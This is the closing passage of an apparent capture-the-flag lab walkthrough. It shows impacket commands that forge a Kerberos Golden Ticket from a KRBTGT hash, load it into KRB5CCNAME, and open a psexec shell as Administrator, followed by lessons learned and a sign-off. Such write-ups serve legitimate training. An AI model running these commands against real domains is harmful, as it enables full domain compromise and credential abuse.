Golden Ticket:\nimpacket-ticketer -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Lets get the root flag:\nLessons Learned: What did I learn? Try simple, kerberoast when we have creds can lead to easy wins and privesc paths. What silly mistakes did I make? Had a brainfart in regards to using psexec that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
